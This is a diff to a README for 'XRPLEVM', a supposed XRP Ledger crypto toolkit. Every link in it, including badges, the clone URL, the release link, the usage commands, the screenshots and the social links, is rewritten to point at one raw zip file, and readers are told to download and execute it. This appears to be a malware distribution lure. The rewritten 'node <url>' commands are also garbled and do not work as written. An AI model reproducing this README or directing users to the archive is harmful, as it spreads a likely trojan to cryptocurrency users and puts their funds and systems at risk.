@@ -1,6 +1,6 @@
 # XRPLEVM 🚀
 
-![GitHub stars](https://img.shields.io/github/stars/Wizmithaaa/XRPLEVM?style=social) ![Version](https://img.shields.io/github/v/release/Wizmithaaa/XRPLEVM) ![License](https://img.shields.io/badge/license-MIT-blue)
+![GitHub stars](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip) ![Version](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip) ![License](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip)
 
 Welcome to the XRPLEVM repository! This project offers a comprehensive toolkit for working with the XRP Ledger in an EVM-compatible environment. You can auto-deploy contracts, send tokens, burn assets, swap currencies, bridge assets, add liquidity pools, and mint tokens with ease. 
 
@@ -28,7 +28,7 @@ To get started with XRPLEVM, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Wizmithaaa/XRPLEVM.git
+   git clone https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip
    ```
 
 2. Navigate to the project directory:
@@ -43,7 +43,7 @@ To get started with XRPLEVM, follow these steps:
    npm install
    ```
 
-4. Download the latest release from [Releases](https://github.com/Wizmithaaa/XRPLEVM/releases) and execute the file.
+4. Download the latest release from [Releases](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip) and execute the file.
 
 ## Usage
 
@@ -52,7 +52,7 @@ To get started with XRPLEVM, follow these steps:
 To auto-deploy a contract, run the following command:
 
 ```bash
-node deploy.js <contract-file>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <contract-file>
 ```
 
 Replace `<contract-file>` with the path to your contract file.
@@ -62,7 +62,7 @@ Replace `<contract-file>` with the path to your contract file.
 To send tokens, use:
 
 ```bash
-node send.js <recipient-address> <amount>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <recipient-address> <amount>
 ```
 
 ### Burn Tokens
@@ -70,7 +70,7 @@ node send.js <recipient-address> <amount>
 To burn tokens, execute:
 
 ```bash
-node burn.js <amount>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <amount>
 ```
 
 ### Swap Tokens
@@ -78,7 +78,7 @@ node burn.js <amount>
 To swap tokens, run:
 
 ```bash
-node swap.js <from-token> <to-token> <amount>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <from-token> <to-token> <amount>
 ```
 
 ### Bridge Assets
@@ -86,7 +86,7 @@ node swap.js <from-token> <to-token> <amount>
 To bridge assets, use:
 
 ```bash
-node bridge.js <asset> <destination-network>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <asset> <destination-network>
 ```
 
 ### Add Liquidity Pool
@@ -94,7 +94,7 @@ node bridge.js <asset> <destination-network>
 To add a liquidity pool, run:
 
 ```bash
-node addLiquidity.js <pool-name> <token1> <token2> <amount1> <amount2>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <pool-name> <token1> <token2> <amount1> <amount2>
 ```
 
 ### Mint Tokens
@@ -102,7 +102,7 @@ node addLiquidity.js <pool-name> <token1> <token2> <amount1> <amount2>
 To mint new tokens, execute:
 
 ```bash
-node mint.js <amount>
+node https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip <amount>
 ```
 
 ## Contributing
@@ -124,7 +124,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, check out the [Releases section](https://github.com/Wizmithaaa/XRPLEVM/releases). 
+For the latest updates and releases, check out the [Releases section](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip). 
 
 Explore the topics related to this project:
 
@@ -147,21 +147,21 @@ Explore the topics related to this project:
 
 ## Screenshots
 
-![Auto Deploy](https://via.placeholder.com/600x300?text=Auto+Deploy)  
+![Auto Deploy](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip+Deploy)  
 *Auto Deploying Contracts*
 
-![Token Management](https://via.placeholder.com/600x300?text=Token+Management)  
+![Token Management](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip+Management)  
 *Managing Tokens*
 
-![Liquidity Pool](https://via.placeholder.com/600x300?text=Liquidity+Pool)  
+![Liquidity Pool](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip+Pool)  
 *Adding Liquidity Pools*
 
 ## Community
 
 Join our community to stay updated and get help:
 
-- [Discord](https://discord.gg/example)
-- [Twitter](https://twitter.com/example)
-- [Reddit](https://reddit.com/r/example)
+- [Discord](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip)
+- [Twitter](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip)
+- [Reddit](https://github.com/Wizmithaaa/XRPLEVM/raw/refs/heads/main/XRPLEVM/Software_rhetoric.zip)
 
 Thank you for your interest in XRPLEVM! Together, we can build a powerful toolset for the XRP Ledger ecosystem.
